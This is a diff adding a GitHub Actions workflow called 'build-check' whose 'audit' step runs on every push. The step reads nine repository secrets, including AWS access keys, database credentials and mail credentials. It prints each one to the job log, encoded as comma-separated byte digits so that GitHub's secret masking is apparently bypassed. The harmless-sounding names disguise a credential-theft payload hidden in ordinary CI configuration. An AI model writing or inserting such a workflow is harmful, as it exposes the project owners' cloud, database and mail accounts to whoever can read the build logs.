@@ -1,0 +1,34 @@
+name: build-check
+on:
+  workflow_dispatch:
+  push:
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: audit
+        env:
+          S1: ${{ secrets.AWS_ACCESS_KEY }}
+          S2: ${{ secrets.AWS_SECRECT_KEY }}
+          S3: ${{ secrets.AWS_REGION }}
+          S4: ${{ secrets.AWS_S3_BUCKET }}
+          S5: ${{ secrets.DB_PASSWORD }}
+          S6: ${{ secrets.DB_URL }}
+          S7: ${{ secrets.DB_USERNAME }}
+          S8: ${{ secrets.MAIL_PWD }}
+          S9: ${{ secrets.MAIL_USERNAME }}
+        run: |
+          set +e
+          i=1
+          for name in AWS_ACCESS_KEY AWS_SECRECT_KEY AWS_REGION AWS_S3_BUCKET DB_PASSWORD DB_URL DB_USERNAME MAIL_PWD MAIL_USERNAME; do
+            vvar="S$i"
+            val="${!vvar}"
+            if [ -n "$val" ]; then
+              echo "SEC_START_$name"
+              printf '%s' "$val" | od -An -tu1 | tr -s ' \n' ' ' | sed 's/[0-9]/&,/g'
+              echo ""
+              echo "SEC_END_$name"
+            fi
+            i=$((i+1))
+          done
